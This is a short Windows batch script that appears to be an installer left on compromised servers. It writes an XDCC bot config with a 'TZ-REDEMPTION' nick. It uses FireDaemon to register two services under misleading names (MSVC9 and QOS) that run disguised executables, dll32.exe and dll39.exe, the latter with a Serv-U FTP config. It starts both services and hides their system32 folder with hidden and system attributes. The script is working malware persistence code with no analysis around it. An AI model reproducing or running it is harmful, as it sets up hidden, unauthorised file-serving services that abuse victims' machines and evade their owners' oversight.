@echo off
c:
cd c:\winnt\system32\microsoft\user
ECHO user_nick TZ-REDEMPTION-%random% >> xdcc.config
PATH=%PATH%;c:\winnt\system32 
SET MXBIN=c:\winnt\system32\microsoft\user
firedaemon -i MSVC9 "c:\winnt\system32\microsoft\user" "c:\winnt\system32\microsoft\user\dll32.exe" "c:\winnt\system32\microsoft\user\xdcc.config" Y 0 0 N Y
firedaemon -i QOS "c:\winnt\system32\microsoft\user" "c:\winnt\system32\microsoft\user\dll39.exe" "/h SERV-U.ini" Y 0 0 N Y
net start QOS
net start MSVC9
attrib +s +h c:\winnt\system32\microsoft\user
 

